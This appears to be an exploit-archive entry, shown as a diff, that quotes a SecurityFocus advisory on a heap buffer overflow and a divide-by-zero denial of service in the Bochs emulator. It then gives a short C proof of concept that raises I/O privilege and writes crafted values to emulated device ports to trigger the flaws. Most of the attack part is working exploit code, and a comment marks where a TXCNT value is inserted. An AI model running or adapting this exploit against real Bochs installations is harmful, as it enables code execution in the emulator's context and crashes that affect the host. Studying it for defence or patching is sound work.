@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/24246/info
+
+Bochs is prone to a heap-based buffer-overflow issue and a denial-of-service issue. The buffer-overflow issue occurs because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized memory buffer. The denial-of-service vulnerability is caused by a divide-by-zero operation.
+
+A local attacker can exploit these issues to execute arbitrary code in the context of the affected application or to cause denial-of-service conditions. Failed exploit attempts of the buffer-overflow vulnerability will also result in denial-of-service conditions. 
+
+#include <sys/io.h>
+
+       int main(int argc, char **argv) {
+       iopl(3);
+       outw(0x5292, 0x24c);
+       outw(0xffff, 0x245);(a)
+       outw(0x1ffb, 0x24e);
+       outb(0x76, 0x241);
+       outb(0x7b, 0x240);
+       outw(0x79c4, 0x247);
+       outw(0x59e6, 0x240);
+       return 0;
+                     }
+
+(a) <- TXCNT is inserted here.
+
+
